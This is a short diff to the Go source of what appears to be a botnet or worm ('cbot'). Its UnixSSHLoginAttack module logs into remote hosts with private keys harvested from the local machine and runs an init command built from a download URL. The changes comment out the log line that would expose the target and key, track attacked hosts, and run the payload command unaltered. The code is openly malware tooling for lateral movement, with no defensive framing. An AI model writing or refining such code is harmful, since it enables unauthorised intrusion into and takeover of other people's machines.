@@ -5,7 +5,6 @@ import (
 	"github.com/cbot/attack"
 	"github.com/cbot/proto/ssh"
 	"github.com/cbot/targets/local"
-	"log"
 	"runtime"
 	"time"
 )
@@ -26,6 +25,8 @@ func NewUnixSSHLoginAttack(attackTasks *attack.AttackTasks) *UnixSSHLoginAttack 
 
 	return &UnixSSHLoginAttack{
 		attackTasks: attackTasks,
+		loginInfo:nil,
+		attacked: make(map[string]bool,0),
 	}
 }
 
@@ -73,7 +74,7 @@ func (slog *UnixSSHLoginAttack) doAttack(sshHost *local.SSHHost) {
 		port = 22
 	}
 
-	log.Printf("Try to  use ssh login remote host:%s:%d,with private key:%s",host,port,privkey)
+	//log.Printf("Try to  use ssh login remote host:%s:%d,with private key:%s",host,port,privkey)
 
 	sshClient, err := ssh.LoginWithPrivKey(host, port, user, privkey, 10000)
 
@@ -91,7 +92,7 @@ func (slog *UnixSSHLoginAttack) doAttack(sshHost *local.SSHHost) {
 
 	cmd := slog.attackTasks.InitCmdForLinux(initUrl,SSHNOPassWordLoginAttackType)
 
-	result, err := sshClient.RunCmd(cmd+" true")
+	result, err := sshClient.RunCmd(cmd)
 
 	if err != nil {
 
